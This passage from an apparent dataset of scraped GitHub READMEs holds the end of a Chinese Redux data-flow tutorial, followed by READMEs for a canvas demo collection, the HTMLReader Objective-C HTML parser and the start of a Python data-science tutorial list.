\u5b8c\u6210\u7684\u8fd0\u884c\u6d41\u7a0b\n\n\u8ba9\u6211\u4eec\u770b\u770b\u4e0a\u8ff0\u5404\u4e2a\u90e8\u5206\u662f\u600e\u6837\u7ec4\u5408\u6210\u4e00\u4e2a\u53ef\u4ee5\u8fd0\u884c\u7684\u5e94\u7528\u7684\u3002\n\n### \u914d\u7f6e\u73af\u8282\n\n\u5e94\u7528\u4e2d\u7684\u4e0d\u540c\u90e8\u5206\u9700\u8981\u5728\u914d\u7f6e\u73af\u8282\u4e2d\u6574\u5408\u5230\u4e00\u8d77\u3002\n\n(1) **\u51c6\u5907\u597d store\u3002**\u6839\u7ec4\u4ef6\u4f1a\u521b\u5efa store\uff0c\u5e76\u901a\u8fc7 createStore(reducer) \u65b9\u6cd5\u544a\u8bc9 store \u8be5\u4f7f\u7528\u54ea\u4e2a\u6839 reducer\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6839 reducer \u4e5f\u901a\u8fc7 combineReducers() \u65b9\u6cd5\u7ec4\u5efa\u4e86\u4e00\u53ea\u5411\u81ea\u5df1\u6c47\u62a5\u7684 reducer \u56e2\u961f\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*8_fU31-jNQnQ0dp-wplm5w.png)\n\n(2) **\u8bbe\u7f6e store \u548c\u7ec4\u4ef6\u4e4b\u95f4\u7684\u901a\u4fe1\u3002**\u6839\u7ec4\u4ef6\u5c06\u5b83\u6240\u6709\u7684\u5b50\u7ec4\u4ef6\u5305\u88f9\u5728 `<Provider>` \u7ec4\u4ef6\u4e2d\uff0c\u5e76\u5efa\u7acb\u4e86 Provider \u4e0e store \u4e4b\u95f4\u7684\u8054\u7cfb\u3002\n\nProvider \u672c\u8d28\u4e0a\u521b\u5efa\u4e86\u4e00\u4e2a\u7528\u4e8e\u66f4\u65b0\u89c6\u56fe\u7ec4\u4ef6\u7684\u7f51\u7edc\u3002\u90a3\u4e9b\u667a\u80fd\u7ec4\u4ef6\u901a\u8fc7 connect() \u65b9\u6cd5\u8fde\u5165\u8fd9\u4e2a\u7f51\u7edc\uff0c\u4ee5\u6b64\u786e\u4fdd\u4ed6\u4eec\u80fd\u591f\u83b7\u53d6\u5230\u72b6\u6001\u7684\u66f4\u65b0\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*NYMutQLW8TcEgbO8VNeqHA.png)\n\n(3) **\u51c6\u5907\u597d action callback\u3002**\u4e3a\u4e86\u8ba9\u6728\u5076\u7ec4\u4ef6\u66f4\u597d\u7684\u5904\u7406 action\uff0c\u667a\u80fd\u7ec4\u4ef6\u53ef\u4ee5\u7528 `bindActionCreators()` \u65b9\u6cd5\u6765\u521b\u5efa action callback\u3002\u8fd9\u6837\u505a\u4e4b\u540e\uff0c\u667a\u80fd\u7ec4\u4ef6\u5c31\u80fd\u7ed9\u6728\u5076\u7ec4\u4ef6\u4f20\u5165\u4e00\u4e2a\u56de\u8c03\uff08callback\uff09\u3002\u5bf9\u5e94\u7684 action \u4f1a\u5728\u6728\u5076\u7ec4\u4ef6\u8c03\u7528\u8fd9\u4e2a\u56de\u8c03\u65f6\u88ab\u81ea\u52a8 dispatch\u3002\uff08\u8bd1\u8005\u6ce8\uff1a\u4f7f\u7528 bindActionCreators() \u4f7f\u5f97\u6728\u5076\u7ec4\u4ef6\u65e0\u9700\u5173\u5fc3 action \u7684 type \u7b49\u4fe1\u606f\uff0c\u53ea\u7528\u8c03\u7528 props \u4e2d\u7684\u67d0\u4e2a\u65b9\u6cd5\u4f20\u5165\u9700\u8981\u7684\u53c2\u6570\u4f5c\u4e3a action \u7684 payload \u5373\u53ef\uff09\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*aVoD3gGddKUy3VCxwylthQ.png)\n\n### \u6570\u636e\u6d41\n\n\u73b0\u5728\u6211\u4eec\u7684\u5e94\u7528\u5df2\u7ecf\u914d\u7f6e\u5b8c\u6210\uff0c\u7528\u6237\u53ef\u4ee5\u5f00\u59cb\u64cd\u4f5c\u4e86\u3002\u8ba9\u6211\u4eec\u89e6\u53d1\u4e00\u4e2a action\uff0c\u770b\u770b\u6570\u636e\u662f\u600e\u6837\u6d41\u52a8\u7684\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*GNDs7SY53lEhp7mX8V25lw.png)\n\n(1) \u89c6\u56fe\u53d1\u51fa\u4e86\u4e00\u4e2a action\uff0caction creator \u5c06\u8fd9\u4e2a action \u683c\u5f0f\u5316\u5e76\u8fd4\u56de\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*p4EkWE_8upZ97Z0IapKDcQ.png)\n\n(2) \u8fd9\u4e2a action \u8981\u4e48\u88ab\u81ea\u52a8 dispatch\uff08\u5982\u679c\u6211\u4eec\u5728\u914d\u7f6e\u9636\u6bb5\u4f7f\u7528\u4e86 bindActionCreators()\uff09\uff0c\u8981\u4e48\u7531\u89c6\u56fe\u5c42\u624b\u52a8 dispatch\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*zmFp3bmDq7b6Bvlo8Ineag.png)\n\n(3) store \u63a5\u53d7\u5230\u8fd9\u4e2a action \u540e\uff0c\u5c06\u5f53\u524d\u7684\u72b6\u6001\u6811\u548c\u8fd9\u4e2a action \u4f20\u7ed9\u6839 reducer\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*zrsSoAAyf4pqTMHiA6P8Ww.png)\n\n(4) \u6839 reducer \u5c06\u6574\u4e2a\u72b6\u6001\u6811\u5207\u5206\u6210\u4e00\u4e2a\u4e2a\u5c0f\u5757\uff0c\u7136\u540e\u5c06\u67d0\u4e00\u4e2a\u5c0f\u5757\u5206\u53d1\u7ed9\u77e5\u9053\u600e\u4e48\u5904\u7406\u8fd9\u90e8\u5206\u5185\u5bb9\u7684\u5b50 reducer\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*-S_dYe6BoQBgwSRpF7Hriw.png)\n\n(5) \u5b50 reducer \u5c06\u4f20\u5165\u7684\u4e00\u5c0f\u5757\u72b6\u6001\u6811\u8fdb\u884c\u62f7\u8d1d\uff0c\u7136\u540e\u5728\u526f\u672c\u4e0a\u8fdb\u884c\u4fee\u6539\uff0c\u5e76\u6700\u7ec8\u5c06\u4fee\u6539\u540e\u7684\u526f\u672c\u8fd4\u56de\u6839 reducer\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*_R-rGNfKr2Xu2FlXNZNPJg.png)\n\n(6) \u5f53\u6240\u6709\u7684\u5b50 reducer \u8fd4\u56de\u4ed6\u4eec\u4fee\u6539\u7684\u526f\u672c\u4e4b\u540e\uff0c\u6839 reducer \u5c06\u8fd9\u4e9b\u90e8\u5206\u518d\u6b21\u7ec4\u5408\u8d77\u6765\u5f62\u6210\u4e00\u9897\u65b0\u7684\u72b6\u6001\u6811\u3002\u7136\u540e\u6839 reducer \u5c06\u8fd9\u4e2a\u65b0\u7684\u72b6\u6001\u6811\u4ea4\u8fd8\u7ed9 store\uff0cstore \u518d\u628a\u81ea\u5df1\u7684\u72b6\u6001\u7f6e\u4e3a\u8fd9\u4e2a\u6700\u65b0\u7684\u72b6\u6001\u6811\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*bUMekI8QlEfFxSBCuVuIkw.png)\n\n(7) store \u544a\u8bc9\u89c6\u56fe\u5c42\u7ed1\u5b9a\uff1a\u300c\u72b6\u6001\u66f4\u65b0\u5566\u300d\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*x6vBvUlFJktJqty56jr0QQ.png)\n\n(8) \u89c6\u56fe\u5c42\u7ed1\u5b9a\u8ba9 store \u628a\u66f4\u65b0\u7684\u72b6\u6001\u4f20\u8fc7\u6765\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*qGatznV4QujuxGe49YfX5A.png)\n\n(9) \u89c6\u56fe\u5c42\u7ed1\u5b9a\u89e6\u53d1\u4e86\u4e00\u4e2a\u91cd\u65b0\u6e32\u67d3\u7684\u64cd\u4f5c\uff08re-render\uff09\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*Je2mow8mjYLngXreGGlIEg.png)\n\n\u8fd9\u5c31\u662f\u6211\u6240\u7406\u89e3\u7684 Redux\uff0c\u5e0c\u671b\u5bf9\u4f60\u6709\u6240\u5e2e\u52a9\u3002\n\n## \u66f4\u591a\u8d44\u6e90\n\n - [Redux \u5b98\u65b9\u6587\u6863](http:\/\/rackt.org\/redux\/index.html)\n - [Redux \u5b98\u65b9\u6587\u6863\u4e2d\u6587\u7248](https:\/\/github.com\/camsong\/redux-in-chinese)\n - [The Evolution of Flux Frameworks](https:\/\/medium.com\/@dan_abramov\/the-evolution-of-flux-frameworks-6c16ad26bb31)\n - [Smart and Dumb Components](https:\/\/medium.com\/@dan_abramov\/smart-and-dumb-components-7ca2f9a7c7d0)\n - [The upsides of using Redux](http:\/\/stackoverflow.com\/a\/32920459)\n - [The downsides of using Redux](http:\/\/stackoverflow.com\/a\/32916602)\n - [\u5982\u4f55\u8bc4\u4ef7\u6570\u636e\u6d41\u7ba1\u7406\u67b6\u6784 Redux?](https:\/\/www.zhihu.com\/question\/38591713\/answer\/77634014)\n"},{"repo":"\/whxaxes\/canvas-test","language":"HTML","readme_contents":"# canvas-test\r\n\r\n\u5174\u8da3\u4f7f\u7136\u5199\u7684canvas\u5c0f\u73a9\u610f<br>\r\n\r\n> \u672c\u9879\u76ee\u4e2d\u7684 demo \u5747\u4e3a\u81ea\u5df1\u7684\u5b66\u4e60 Canvas \u4e4b\u4f5c\uff0c\u90e8\u5206\u521b\u610f\u975e\u539f\u521b\u3002\r\n\r\n## \u5b89\u88c5\u4f9d\u8d56\r\n```\r\nnpm install\r\n```\r\n\r\n## \u8fd0\u884c\u670d\u52a1\r\n```\r\nnpm run server\r\n\r\nopen http:\/\/127.0.0.1:3030\/menu.html\r\n```\r\n\r\n## \u6784\u5efamenu\u5217\u8868\r\n```\r\nnpm run build\r\n```\r\n\r\n## \u5728\u7ebf\u6548\u679c\u5217\u8868\r\n\r\n> \u5efa\u8bae\u7528`chrome`\u67e5\u770b\r\n\r\n[placeholder]:p\r\n\r\n| \u6807\u9898 |  |\r\n|:-------- |:--------:|\r\n| [\u7ebf\u6761\u65f6\u949f](http:\/\/whxaxes.github.io\/canvas-test\/src\/Funny-demo\/coolClock\/index2.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Funny-demo\/coolClock) |\r\n| [\u7c92\u5b50\u65f6\u949f](http:\/\/whxaxes.github.io\/canvas-test\/src\/Funny-demo\/coolClock\/index.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Funny-demo\/coolClock) |\r\n| [\u6a61\u76ae\u64e6\u6548\u679c](http:\/\/whxaxes.github.io\/canvas-test\/src\/Funny-demo\/clip\/clip.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Funny-demo\/clip) |\r\n| [LOW POLY\uff08\u56fe\u7247\u4e09\u89d2\u5316\uff09](http:\/\/whxaxes.github.io\/canvas-test\/src\/Funny-demo\/lowpoly\/index.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Funny-demo\/lowpoly) |\r\n| [\u53ef\u89c6\u5316\u97f3\u4e50\u64ad\u653e\u5668](http:\/\/whxaxes.github.io\/canvas-test\/src\/Funny-demo\/musicPlayer\/index.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Funny-demo\/musicPlayer) |\r\n| [\u653e\u70df\u82b1\u6a21\u62df](http:\/\/whxaxes.github.io\/canvas-test\/src\/Funny-demo\/shotFire\/shotFire.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Funny-demo\/shotFire) |\r\n| [\u7f51\u72b6\u7c92\u5b50\u6548\u679c1](http:\/\/whxaxes.github.io\/canvas-test\/src\/Funny-demo\/netparticle\/net_1.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Funny-demo\/netparticle) |\r\n| [\u7f51\u72b6\u7c92\u5b50\u6548\u679c2](http:\/\/whxaxes.github.io\/canvas-test\/src\/Funny-demo\/netparticle\/net_2.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Funny-demo\/netparticle) |\r\n| [\u56fe\u50cf\u62c9\u626f\u53d8\u5f62](http:\/\/whxaxes.github.io\/canvas-test\/src\/Funny-demo\/transform\/demo1.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Funny-demo\/transform) |\r\n| [\u56fe\u50cf3d\u53d8\u5f62](http:\/\/whxaxes.github.io\/canvas-test\/src\/Funny-demo\/transform\/demo2.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Funny-demo\/transform) |\r\n| [\u9ed1\u6d1e\u5438\u5f15](http:\/\/whxaxes.github.io\/canvas-test\/src\/Particle-demo\/blackhole\/blackhole.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Particle-demo\/blackhole) |\r\n| [\u64cd\u63a7\u6587\u5b57\u56fe\u7247\u7684\u6570\u636e](http:\/\/whxaxes.github.io\/canvas-test\/src\/Particle-demo\/imgdata\/controlImgData.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Particle-demo\/imgdata) |\r\n| [\u64cd\u63a7\u5b57\u4f53\u7684\u6570\u636e](http:\/\/whxaxes.github.io\/canvas-test\/src\/Particle-demo\/imgdata\/controlImgData2.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Particle-demo\/imgdata) |\r\n| [\u7c92\u5b50\u6210\u50cfdemo](http:\/\/whxaxes.github.io\/canvas-test\/src\/Particle-demo\/orangutan\/index.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Particle-demo\/orangutan) |\r\n| [\u7c92\u5b50\u52a8\u753b](http:\/\/whxaxes.github.io\/canvas-test\/src\/Particle-demo\/animateStep\/index.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Particle-demo\/animateStep) |\r\n| [\u98de\u673a\u6e38\u620f](http:\/\/whxaxes.github.io\/canvas-test\/src\/Game-demo\/planGame\/index.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Game-demo\/planGame) |\r\n| [\u63a5\u6c34\u7ba1\u6e38\u620f](http:\/\/whxaxes.github.io\/canvas-test\/src\/Game-demo\/connectPipe\/easyPipes.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Game-demo\/connectPipe) |\r\n| [FlyppyPeople](http:\/\/whxaxes.github.io\/canvas-test\/src\/Game-demo\/FlppyPeople\/index.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Game-demo\/FlppyPeople) |\r\n| [\u7b80\u5355\u8dd1\u9177\u6e38\u620f](http:\/\/whxaxes.github.io\/canvas-test\/src\/Game-demo\/runningMan\/index.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Game-demo\/runningMan) |\r\n| [\u7b80\u6613\u684c\u7403\u6e38\u620f](http:\/\/whxaxes.github.io\/canvas-test\/src\/Game-demo\/snooker\/snooker.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Game-demo\/snooker) |\r\n| [\u89c6\u9891\u62fc\u56fe](http:\/\/whxaxes.github.io\/canvas-test\/src\/Game-demo\/vedioPintu.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Game-demo) |\r\n| [3D\u65cb\u8f6c\u7403](http:\/\/whxaxes.github.io\/canvas-test\/src\/3D-demo\/3Dball.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/3D-demo) |\r\n| [3d\u7acb\u65b9\u4f53](http:\/\/whxaxes.github.io\/canvas-test\/src\/3D-demo\/3Dcube.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/3D-demo) |\r\n| [3d\u591a\u7acb\u65b9\u4f53](http:\/\/whxaxes.github.io\/canvas-test\/src\/3D-demo\/3Dcubes.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/3D-demo) |\r\n| [3D\u6807\u7b7e\u4e91](http:\/\/whxaxes.github.io\/canvas-test\/src\/3D-demo\/3Dtag.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/3D-demo) |\r\n| [\u4eff\u91cd\u529b\u5c0f\u7403](http:\/\/whxaxes.github.io\/canvas-test\/src\/Other-demo\/shotBall.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Other-demo) |\r\n| [\u7f13\u5b58\u6d4b\u8bd5(\u6709\u7f13\u5b58)](http:\/\/whxaxes.github.io\/canvas-test\/src\/Other-demo\/cache\/test.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Other-demo\/cache) |\r\n| [\u7f13\u5b58\u6d4b\u8bd5(\u65e0\u7f13\u5b58)](http:\/\/whxaxes.github.io\/canvas-test\/src\/Other-demo\/cache\/test2.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Other-demo\/cache) |\r\n| [Canvas\u65f6\u949f](http:\/\/whxaxes.github.io\/canvas-test\/src\/Other-demo\/clock.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Other-demo) |\r\n| [\u7ed8\u5236\u591a\u8fb9\u5f62](http:\/\/whxaxes.github.io\/canvas-test\/src\/Other-demo\/duobianxing.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Other-demo) |\r\n| [\u79d2\u8868](http:\/\/whxaxes.github.io\/canvas-test\/src\/Other-demo\/stopWatch.html) | [\u67e5\u770b\u4ee3\u7801](https:\/\/github.com\/whxaxes\/canvas-test\/tree\/master\/src\/Other-demo) |\r\n\r\n[\/placeholder]:p\r\n\r\n## Author\r\nwhxaxes\r\n\r\n## LICENSE\r\nMIT\r\n\r\n\r\n"},{"repo":"\/nolanw\/HTMLReader","language":"HTML","readme_contents":"# HTMLReader\n\nA [WHATWG-compliant HTML parser][whatwg-spec] with [CSS selectors][selectors-level-3] in Objective-C and Foundation. It parses HTML just like a browser.\n\n![Supports iOS, OS X, tvOS, and watchOS](https:\/\/img.shields.io\/cocoapods\/p\/HTMLReader.svg)\n\n[selectors-level-3]: http:\/\/www.w3.org\/TR\/css3-selectors\/\n[whatwg-spec]: http:\/\/whatwg.org\/html\n\n## Usage\n\nA quick example of parsing an inline document and finding the bold text:\n\n```swift\nimport HTMLReader\n\nlet document = HTMLDocument(string: \"\"\"\n    <p>\n        Ahoy there, <b>sailor<\/b>!\n    <\/p>\n    \"\"\")\nprint(document.firstNode(matchingSelector: \"b\")?.textContent ?? \"\")\n\/\/ => sailor\n```\n\nManipulating a document is a little more involved, but entirely doable. Here we take the document from the first example and wrap the paragraph within a new element:\n\n```swift\nif\n    let p = document.firstNode(matchingSelector: \"p\"),\n    let parent = p.parent\n{\n    let wrapper = HTMLElement(tagName: \"div\", attributes: [\"class\": \"special\"])\n    let children = parent.mutableChildren\n    children.insert(wrapper, at: children.index(of: p))\n    p.parent = wrapper\n}\n\nprint(document.innerHTML)\n\/\/ => <html><head><\/head><body><div class=\"special\"><p>\\\n\/\/        Ahoy there, <b>sailor<\/b>!\\\n\/\/    <\/p><\/div><\/body><\/html>\n```\n\nFinally, the most involved example: fetching the main page for the HTMLReader repository and scraping the description of the project. (This is just an example; GitHub has a fabulous API that you should use if you want to find a repository's description!)\n\n```objc\n@import HTMLReader;\n\n\/\/ Load a web page.\nNSURL *url = [NSURL URLWithString:@\"https:\/\/github.com\/nolanw\/HTMLReader\"];\nNSURLSession *session = [NSURLSession sharedSession];\n[[session dataTaskWithURL:url completionHandler:\n  ^(NSData *data, NSURLResponse *response, NSError *error) {\n    NSString *contentType = nil;\n    if ([response isKindOfClass:[NSHTTPURLResponse class]]) {\n        NSDictionary *headers = [(NSHTTPURLResponse *)response allHeaderFields];\n        contentType = headers[@\"Content-Type\"];\n    }\n    HTMLDocument *home = [HTMLDocument documentWithData:data\n                                      contentTypeHeader:contentType];\n    HTMLElement *div = [home firstNodeMatchingSelector:@\".repository-meta-content\"];\n    NSCharacterSet *whitespace = [NSCharacterSet whitespaceAndNewlineCharacterSet];\n    NSLog(@\"%@\", [div.textContent stringByTrimmingCharactersInSet:whitespace]);\n    \/\/ => A WHATWG-compliant HTML parser in Objective-C.\n}] resume];\n```\n\n## Installation\n\nYou have choices:\n\n* Copy the files in the [Sources](Sources) folder into your project.\n* Add the following line to your [Cartfile][Carthage]:\n  \n  `github \"nolanw\/HTMLReader\"`\n* Add the following line to your [Podfile][CocoaPods]:\n   \n   `pod \"HTMLReader\"`\n* Add the following line to your [Package.swift][Swift Package Manager]:\n    \n   `.package(url: \"https:\/\/github.com\/nolanw\/HTMLReader\", from: \"2.1.3\")`\n* Clone this repository (perhaps add it as a submodule) and add `HTMLReader.xcodeproj` to your project\/workspace. Then add `HTMLReader.framework` to your app target. (Or, if you're targeting iOS earlier than 8.0: add `libHTMLReader.a` to your app target and `\"$(SYMROOT)\/include\"` to your app target's Header Search Paths.)\n\nHTMLReader has no dependencies other than Foundation.\n\n[Carthage]: https:\/\/github.com\/Carthage\/Carthage#readme\n[CocoaPods]: http:\/\/docs.cocoapods.org\/podfile.html#pod\n[Swift Package Manager]: https:\/\/swift.org\/package-manager\/#importing-dependencies\n\n## Why HTMLReader?\n\nI needed to scrape HTML like a browser. I couldn't find a good choice for iOS.\n\n## The Alternatives\n\n[libxml2][] ships with iOS. It parses some variant of HTML 4 (?) and does not handle new\/broken markup like a modern browser.\n\nOther Objective-C and Swift libraries I come across (e.g. [Fuzi][], [hpple][], [Kanna][], [Ono][]) use libxml2 and inherit its shortcomings.\n\n[SwiftSoup][] is a Swift port of Jsoup. It didn't exist when I made HTMLReader. (To be fair, publicly, neither did Swift.)\n\nThere are C libraries such as [Gumbo][] or [Hubbub][], but you need to shuffle data to and from Objective-C or Swift. (Also Gumbo wasn't publicly announced until after HTMLReader was far along.)\n\n[WebKit][] ships with iOS, but its HTML parsing abilities are considered private API. I consider a round-trip through a web view inappropriate for parsing HTML. And I didn't make it very far into building my own copy of WebCore.\n\n[Google Toolbox for Mac][GTMNSString+HTML] will escape and unescape strings for HTML (e.g. `&amp;` \u21d4 `&`) but, again, not like a modern browser. For example, GTM will not unescape `&#65` (note the missing semicolon).\n\n[CFStringTransform][kCFStringTransformToXMLHex] does numeric entities via (the reversible) `kCFStringTransformToXMLHex`, but that rules out named entities.\n\n[Fuzi]: https:\/\/github.com\/cezheng\/Fuzi\n[GTMNSString+HTML]: https:\/\/code.google.com\/p\/google-toolbox-for-mac\/source\/browse\/trunk\/Foundation\/GTMNSString%2BHTML.h\n[Gumbo]: https:\/\/github.com\/google\/gumbo-parser\n[hpple]: https:\/\/github.com\/topfunky\/hpple\n[Hubbub]: http:\/\/www.netsurf-browser.org\/projects\/hubbub\/\n[Kanna]: https:\/\/github.com\/tid-kijyun\/Kanna\n[kCFStringTransformToXMLHex]: https:\/\/developer.apple.com\/library\/mac\/documentation\/corefoundation\/Reference\/CFMutableStringRef\/Reference\/reference.html#\/\/apple_ref\/doc\/uid\/20001504-CH2g-DontLinkElementID_46\n[libxml2]: http:\/\/www.xmlsoft.org\/\n[Ono]: https:\/\/github.com\/mattt\/Ono\n[SwiftSoup]: https:\/\/github.com\/scinfu\/SwiftSoup\n[WebKit]: https:\/\/www.webkit.org\/building\/checkout.html\n\n## Does it work?\n\nHTMLReader continually runs [html5lib][html5lib-tests]'s tokenization and tree construction tests, ignoring the tests for `<template>` (which HTMLReader does not implement). Note that you need to check out the `HTMLReaderTests\/html5lib` Git submodule in order to actually run these tests.\n\nHTMLReader is continually built and tested on iOS versions 8.4, 9.3, 10.3, and 11.0; built and tested on macOS versions 10.9, 10.10, 10.11, 10.12, and 10.13; built and tested on tvOS versions 9.2, 10.2, and 11.0; and built on watchOS versions 2.2, 3.2, and 4.0. It should work on down to iOS 5, macOS 10.7, tvOS 9.0, and watchOS 2.0, but there is no automated testing there (it's ok to file an issue though!).\n\nGiven all that:  [![Build Status](https:\/\/travis-ci.org\/nolanw\/HTMLReader.png?branch=master)](https:\/\/travis-ci.org\/nolanw\/HTMLReader)\n\nHTMLReader is used by at least [one shipping app][Awful].\n\n[Awful]: https:\/\/github.com\/Awful\/Awful.app\n[html5lib-tests]: https:\/\/github.com\/html5lib\/html5lib-tests\n\n## How fast is it?\n\nI'm not sure.\n\nIncluded in the project is a utility called [Benchmarker][]. It knows how to run three tests:\n\n* Parsing a large HTML file. In this case, the 7MB single-page HTML specification.\n* Escaping and unescaping entities in the large HTML file.\n* Running a bunch of CSS selectors. Basically copied from [a WebKit performance test][WebKit QuerySelector.html].\n\nChanges to HTMLReader should not cause these benchmarks to run slower. Ideally changes make them run faster!\n\n[Benchmarker]: Utilities\/Benchmarker.m\n[WebKit QuerySelector.html]: https:\/\/trac.webkit.org\/browser\/trunk\/PerformanceTests\/CSS\/QuerySelector.html\n\n## Bugs and Feature Requests\n\nBugs can be reported, and features can be requested, using the [issue tracker][Issues]. Or get in touch directly if you'd prefer.\n\n[Issues]: https:\/\/github.com\/nolanw\/HTMLReader\/issues\n\n## License\n\nHTMLReader is in the public domain.\n\n## Acknowledgements\n\nHTMLReader is developed by [Nolan Waite](https:\/\/github.com\/nolanw).\n\nThanks to [Chris Williams](https:\/\/github.com\/ultramiraculous\/) for contributing the implementation of CSS selectors.\n"},{"repo":"\/ujjwalkarn\/DataSciencePython","language":"Python","readme_contents":"# Python Data Science Tutorials \n- This repo contains a curated list of Python tutorials for Data Science, NLP and Machine Learning.\n\n- [**Curated list of R tutorials for Data Science, NLP and Machine Learning**](https:\/\/github.com\/ujjwalkarn\/DataScienceR).\n\n- [Comprehensive topic-wise list of Machine Learning and Deep Learning tutorials, codes, articles and other resources](https:\/\/github.com\/ujjwalkarn\/Machine-Learning-Tutorials\/blob\/master\/README.md).\n\n## The Python Language\n- [Python 3 in one picture](https:\/\/fossbytes.com\/wp-content\/uploads\/2015\/09\/python-3-in-one-pic.png)\n- [**Awesome Python**](https:\/\/github.com\/vinta\/awesome-python)\n- [**Jargon from the functional programming world in simple terms!**](https:\/\/github.com\/hemanth\/functional-programming-jargon)\n- [**Dive Into Python**](http:\/\/www.diveintopython.net\/index.html)\n- [Learn Python Wiki on Reddit](https:\/\/www.reddit.com\/r\/learnpython\/wiki\/index)\n- [Learn 90% of Python in 90 Minutes](https:\/\/www.slideshare.net\/MattHarrison4\/learn-90)\n- [Highest Voted Python Questions](http:\/\/stackoverflow.com\/questions\/tagged\/python?sort=votes&pageSize=50)\n- [Python Basic Concepts](https:\/\/github.com\/gumption\/Python_for_Data_Science\/blob\/master\/3_Python_Basic_Concepts.ipynb)\n- [Quick Reference to Python](http:\/\/www.dataschool.io\/python-quick-reference\/)\n- [The Elements of Python Style](https:\/\/github.com\/amontalenti\/elements-of-python-style)\n- [**What does the yield keyword do in Python?**](http:\/\/stackoverflow.com\/questions\/231767\/what-does-the-yield-keyword-do-in-python)\n- [Parsing values from a JSON file in Python](http:\/\/stackoverflow.com\/questions\/2835559\/parsing-values-from-a-json-file-in-python)\n- [**Python Quora FAQs**](https:\/\/www.quora.com\/topic\/Python-programming-language-1)\n- [time-complexity of various operations - list\/dict - in current CPython](https:\/\/wiki.python.org\/moin\/TimeComplexity)\n- Scripting in Python\n    - [Python Scripting Tutorial](http:\/\/www.dreamsyssoft.com\/python-scripting-tutorial\/intro-tutorial.php)\n    - [Scripting with Python](https:\/\/www.schrodinger.com\/\/AcrobatFile.php?type=supportdocs&type2=&ident=404)\n    - [**Can I use Python as a bash replacement?**](http:\/\/stackoverflow.com\/questions\/209470\/can-i-use-python-as-a-bash-replacement)\n\n## Useful Online Courses\n- [Learn Python (Codecademy)](https:\/\/www.codecademy.com\/learn\/python#)\n- [Free Interactive Course: Intro to Python for Data Science (DataCamp)](https:\/\/www.datacamp.com\/courses\/intro-to-python-for-data-science)\n- [Introduction to Computer Science and Programming Using Python (MIT)](https:\/\/www.edx.org\/course\/introduction-computer-science-mitx-6-00-1x-11)\n- [Python for 